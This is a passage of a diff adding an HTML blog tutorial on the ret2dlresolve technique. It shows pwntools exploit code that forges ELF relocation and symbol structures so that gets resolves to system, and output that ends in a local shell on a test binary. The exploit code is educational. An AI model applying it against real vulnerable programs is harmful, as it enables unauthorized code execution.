+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sh">'</span><span class="s">[O] Structures set</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>As you can see, we are also placing <code class="language-plaintext highlighter-rouge">/bin/sh</code> at the end, we will explain why in the next step.</p>
+
+<ol>
+  <li>Call _dl_resolve with the index pointing to our fake El64_Rel structure.</li>
+</ol>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span><span class="p">.</span><span class="nf">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">xx</span><span class="sh">'</span><span class="p">)</span>
+<span class="nf">assert</span><span class="p">(</span><span class="n">rel_offset</span> <span class="o">%</span> <span class="mi">24</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="c1"># We need to assert the address is divisible by Elf64_Rel size (24)
+</span><span class="n">p</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">[*] Launching dl_resolve... with rel at offset </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">rel_offset</span><span class="o">/</span><span class="mi">24</span><span class="p">))</span><span class="si">}</span><span class="s"> - real </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">rel_offset</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="nf">p64</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">PIVOTED_STACK</span><span class="o">+</span><span class="mh">0x50</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">RESOLVER</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="nf">int</span><span class="p">(</span><span class="n">rel_offset</span><span class="o">/</span><span class="mi">24</span><span class="p">))</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="sh">'</span><span class="s">main</span><span class="sh">'</span><span class="p">]</span> <span class="o">+</span> <span class="mi">12</span><span class="p">))</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">info</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Final stack addr at </span><span class="si">{</span><span class="nf">hex</span><span class="p">(</span><span class="n">PIVOTED_STACK</span><span class="o">+</span><span class="mh">0x50</span><span class="p">)</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="triggering-our-new-resolved-function">Triggering our new resolved function</h3>
+
+<p>So you probably realized at this point that there is no more code after this. We simply jump in main again and it… works?</p>
+
+<p>The reason it works is because, if you remember, we set Elf64_Rel entry to point to <code class="language-plaintext highlighter-rouge">gets</code>. This means when <code class="language-plaintext highlighter-rouge">gets</code> is executed
+later on again it won’t call <code class="language-plaintext highlighter-rouge">gets</code> but <code class="language-plaintext highlighter-rouge">system</code>.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   <span class="mh">0x000000000040117e</span> <span class="o">&lt;+</span><span class="mi">27</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">lea</span>    <span class="n">rax</span><span class="p">,[</span><span class="n">rbp</span><span class="o">-</span><span class="mh">0x10</span><span class="p">]</span>
+   <span class="mh">0x0000000000401182</span> <span class="o">&lt;+</span><span class="mi">31</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="n">rdi</span><span class="p">,</span><span class="n">rax</span>
+   <span class="mh">0x0000000000401185</span> <span class="o">&lt;+</span><span class="mi">34</span><span class="o">&gt;</span><span class="p">:</span>	<span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span><span class="mh">0x0</span>
+</code></pre></div></div>
+
+<p>All we need to do is to set rbp-0x10 to our <code class="language-plaintext highlighter-rouge">/bin/sh</code> call and our shell is popped. That’s the reason why the last stack needs to be
+set exactly +0x10 from where we left <code class="language-plaintext highlighter-rouge">/bin/sh</code>.</p>
+
+<blockquote>
+  <p>Note that <code class="language-plaintext highlighter-rouge">_dl_resolve</code> will call the resolve function when resolved. We could have simply put <code class="language-plaintext highlighter-rouge">/bin/sh</code> in <code class="language-plaintext highlighter-rouge">rdi</code> and it would
+have worked too but in our case that gadget did not exist so we had to take this route. Note that this other approach is
+what pwntools aims to do when using their <code class="language-plaintext highlighter-rouge">ret2dlresolve</code>.</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] Starting <span class="nb">local </span>process <span class="s1">'./test'</span>: pid 20091
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="s1">'/home/litios/ret2libc/test'</span>
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Stack pivoting performed to 0x404f10
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span><span class="k">*</span><span class="o">]</span> REL LIST ADDR: 0x400500
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span><span class="k">*</span><span class="o">]</span> SYM LIST ADDR: 0x4003d0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span><span class="k">*</span><span class="o">]</span> STR LIST ADDR: 0x400448
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span><span class="k">*</span><span class="o">]</span> Setting <span class="s2">"system"</span> at 0x404f20
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span><span class="k">*</span><span class="o">]</span> Setting El64_Sym at 0x404f30
+<span class="o">[</span><span class="k">*</span><span class="o">]</span>     <span class="k">*</span> String index at: 0x4ad8
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span><span class="k">*</span><span class="o">]</span> Setting El64_Rel at 0x404f40
+<span class="o">[</span><span class="k">*</span><span class="o">]</span>     <span class="k">*</span> Replacing gets at: 0x404008
+<span class="o">[</span><span class="k">*</span><span class="o">]</span>     <span class="k">*</span> Fake index is at: 0x324 :: final r_info: 0x32400000007
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span>O] Structures <span class="nb">set</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="o">[</span><span class="k">*</span><span class="o">]</span> Launching dl_resolve... with rel at offset 0x318 - real 0x4a40
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Final stack addr at 0x404f60
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> <span class="k">**************************************************</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> All <span class="nb">set</span><span class="p">;</span> that was a <span class="nb">nice </span>ride<span class="p">;</span> here is your shell :<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Switching to interactive mode
+
+<span class="nv">$ </span><span class="nb">whoami
+</span>litios
+</code></pre></div></div>
+
+<blockquote>
+  <p>Feel free to reach out if you spot any mistakes!</p>
+</blockquote>
+
+<p><strong>Happy hacking!</strong></p>
+
+
+        </div>
+    </main>
+
+    
+    </body>
+</html>
